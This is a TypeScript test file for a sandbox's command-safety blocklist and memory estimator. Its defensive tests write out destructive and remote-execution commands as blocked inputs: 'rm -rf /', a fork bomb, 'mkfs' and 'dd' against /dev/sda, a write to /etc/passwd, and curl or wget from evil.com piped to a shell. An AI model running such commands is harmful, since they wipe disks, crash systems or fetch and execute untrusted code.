import { describe, it, expect } from 'vitest';

// Test the safety blocklist and resource estimation directly
const BLOCKED_PATTERNS = [
  /rm\s+(-rf?|--recursive)\s+\//,
  /mkfs/,
  /dd\s+if=/,
  /:\(\)\{.*\}/,
  /shutdown/,
  /reboot/,
  /chmod\s+777\s+\//,
  /chown.*\//,
  />\s*\/etc\//,
  />\s*\/sys\//,
  />\s*\/proc\//,
  /curl.*\|\s*(ba)?sh/,
  /wget.*\|\s*(ba)?sh/,
];

function isCommandSafe(command: string): { safe: boolean; reason?: string } {
  for (const pattern of BLOCKED_PATTERNS) {
    if (pattern.test(command)) {
      return { safe: false, reason: `Blocked pattern detected: ${pattern.source}` };
    }
  }
  return { safe: true };
}

function estimateResources(code: string): { memoryMB: number; cpuIntensive: boolean; warning?: string } {
  const hasLargeData = /\d{4,}/.test(code) || /range\(\d{5,}\)/.test(code);
  const hasML = /sklearn|tensorflow|torch|keras/.test(code);
  const hasPlotting = /matplotlib|plt\.|seaborn/.test(code);

  let memoryMB = 128;
  let cpuIntensive = false;

  if (hasLargeData) { memoryMB = 512; cpuIntensive = true; }
  if (hasML) { memoryMB = 1024; cpuIntensive = true; }
  if (hasPlotting) { memoryMB = Math.max(memoryMB, 256); }

  let warning: string | undefined;
  if (memoryMB > 512) {
    warning = `Estimated ${memoryMB}MB memory. This may take a while.`;
  }

  return { memoryMB, cpuIntensive, warning };
}

describe('command safety', () => {
  it('should block rm -rf /', () => {
    expect(isCommandSafe('rm -rf /')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block rm --recursive /', () => {
    expect(isCommandSafe('rm --recursive /etc')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block fork bombs', () => {
    expect(isCommandSafe(':(){:|:&};:')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block mkfs', () => {
    expect(isCommandSafe('mkfs.ext4 /dev/sda')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block dd if=', () => {
    expect(isCommandSafe('dd if=/dev/zero of=/dev/sda')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block curl piped to shell', () => {
    expect(isCommandSafe('curl http://evil.com | bash')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block wget piped to shell', () => {
    expect(isCommandSafe('wget http://evil.com -O - | sh')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block shutdown', () => {
    expect(isCommandSafe('shutdown -h now')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should block writes to /etc/', () => {
    expect(isCommandSafe('echo bad > /etc/passwd')).toEqual({
      safe: false,
      reason: expect.stringContaining('Blocked'),
    });
  });

  it('should allow safe commands', () => {
    expect(isCommandSafe('ls -la')).toEqual({ safe: true });
    expect(isCommandSafe('cat file.txt')).toEqual({ safe: true });
    expect(isCommandSafe('python3 analysis.py')).toEqual({ safe: true });
    expect(isCommandSafe('echo hello')).toEqual({ safe: true });
    expect(isCommandSafe('grep -r "pattern" .')).toEqual({ safe: true });
  });
});

describe('resource estimation', () => {
  it('should return base memory for simple code', () => {
    const est = estimateResources('print("hello")');
    expect(est.memoryMB).toBe(128);
    expect(est.cpuIntensive).toBe(false);
    expect(est.warning).toBeUndefined();
  });

  it('should flag ML code as cpu intensive with high memory', () => {
    const est = estimateResources('import sklearn\nfrom sklearn.ensemble import RandomForestClassifier');
    expect(est.memoryMB).toBe(1024);
    expect(est.cpuIntensive).toBe(true);
    expect(est.warning).toBeDefined();
  });

  it('should flag tensorflow', () => {
    const est = estimateResources('import tensorflow as tf');
    expect(est.memoryMB).toBe(1024);
    expect(est.cpuIntensive).toBe(true);
  });

  it('should flag plotting code', () => {
    const est = estimateResources('import matplotlib.pyplot as plt\nplt.plot([1,2,3])');
    expect(est.memoryMB).toBe(256);
  });

  it('should flag large data ranges', () => {
    const est = estimateResources('for i in range(100000): pass');
    expect(est.memoryMB).toBe(512);
    expect(est.cpuIntensive).toBe(true);
  });
});
